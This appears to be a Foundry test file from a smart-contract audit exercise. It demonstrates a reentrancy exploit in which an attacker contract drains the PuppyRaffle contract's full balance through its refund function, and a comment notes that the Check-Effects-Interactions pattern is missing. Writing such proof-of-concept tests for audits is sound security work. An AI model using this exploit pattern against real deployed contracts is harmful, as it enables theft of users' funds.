// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {ReentrancyAttacker} from "./utils/ReentrancyAttacker.sol";

contract Reentrancy is Test {

    PuppyRaffle puppyRaffle;
    ReentrancyAttacker attacker;
    
    uint256 entranceFee = 1e18;
    address evilPlayer;
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );

        attacker = new ReentrancyAttacker(address(puppyRaffle));
        evilPlayer = address(attacker);

    }


    // The Check-Effects-Interactions pattern is not followed
    // So reentrancy can happen in the PuppyRaffle:refund function if a player 
    // is an Attack contract 
    function testReentrancy() public {
        address[] memory players = new address[](4);
        players[0] = evilPlayer;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        console.log("4 Players have entered the raffle");

        uint256 raffleBalance = address(puppyRaffle).balance;
        console.log("Balance of the raffle: ", raffleBalance);

        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(evilPlayer);

        vm.prank(evilPlayer);
        puppyRaffle.refund(indexOfPlayer);

        uint256 evilPlayerBalance = address(evilPlayer).balance;
        console.log("Evil Player got: ", evilPlayerBalance);
        console.log("The PuppyRaffle balance is now: ", address(puppyRaffle).balance);

        assertEq(raffleBalance, evilPlayerBalance);
    } 
}
